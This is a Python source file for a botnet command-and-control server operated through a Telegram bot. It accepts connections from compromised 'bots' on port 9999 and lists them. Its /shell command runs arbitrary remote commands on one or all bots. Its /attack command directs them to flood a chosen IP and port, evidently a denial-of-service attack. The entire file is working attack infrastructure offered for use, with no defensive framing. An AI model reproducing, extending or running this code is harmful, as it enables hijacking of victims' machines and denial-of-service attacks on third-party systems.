import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import socket
import threading

bots = {}
TOKEN = "BOT_TOKEN_HERE" # telegram bot token

# new logging function
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def start(update: Update, context: CallbackContext):
    update.message.reply_text("Nothing.")

def bots_command(update: Update, context: CallbackContext):
    if not bots:
        update.message.reply_text("No bots connected.")
    else:
        bot_list = "\n".join([f"{bot_id}: {bots[bot_id][0]}" for bot_id in bots])
        update.message.reply_text(f"Active Bots:\n{bot_list}")

def shell_command(update: Update, context: CallbackContext):
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /shell <bot_id/all> <command>")
        return

    target_bot = args[0]
    command = " ".join(args[1:])

    if target_bot == "all":
        for bot_id, (ip, conn) in bots.items():
            threading.Thread(target=send_command_and_receive_output, args=(conn, command, update)).start()
    elif target_bot in bots:
        conn = bots[target_bot][1]
        threading.Thread(target=send_command_and_receive_output, args=(conn, command, update)).start()
    else:
        update.message.reply_text(f"Bot {target_bot} not found.")

def attack_command(update: Update, context: CallbackContext):
    args = context.args
    if len(args) < 4:
        update.message.reply_text("Usage: /attack <bot_id/all> <ip> <port> <duration>")
        return

    target_bot = args[0]
    target_ip = args[1]
    target_port = int(args[2])
    duration = int(args[3])

    command = f"/attack {target_ip} {target_port} {duration}"

    if target_bot == "all":
        for bot_id, (ip, conn) in bots.items():
            threading.Thread(target=send_attack_command, args=(conn, command)).start()
            update.message.reply_text(f"Attack send to {target_ip}:{target_port} with {duration} seconds\n Using all bots")
    elif target_bot in bots:
        conn = bots[target_bot][1]
        threading.Thread(target=send_attack_command, args=(conn, command)).start()
        update.message.reply_text(f"Attack send to {target_ip}:{target_port} with {duration} seconds\n Using {target_bot} bots")
    else:
        update.message.reply_text(f"Bot {target_bot} not found.")

def send_attack_command(conn, command):
    try:
        conn.send(command.encode())
        logging.info(f"Sent attack command: {command}")
    except Exception as e:
        logging.error(f"Error sending attack command: {str(e)}")

def send_command_and_receive_output(conn, command, update):
    try:
        conn.send(command.encode())
        result = b''  
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            result += chunk
        result = result.decode('utf-8', errors='replace')
        update.message.reply_text(f"Command result:\n{result}")
    except Exception as e:
        update.message.reply_text(f"Error executing command: {str(e)}")

def listen_for_bots():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    
    while True:
        conn, addr = server_socket.accept()
        bot_id = conn.recv(1024).decode()  
        bots[bot_id] = (addr[0], conn)  
        logging.info(f"Bot {bot_id} connected from {addr[0]}")

def main():
    threading.Thread(target=listen_for_bots, daemon=True).start()

    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bots", bots_command))
    dp.add_handler(CommandHandler("shell", shell_command, pass_args=True))
    dp.add_handler(CommandHandler("attack", attack_command, pass_args=True))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
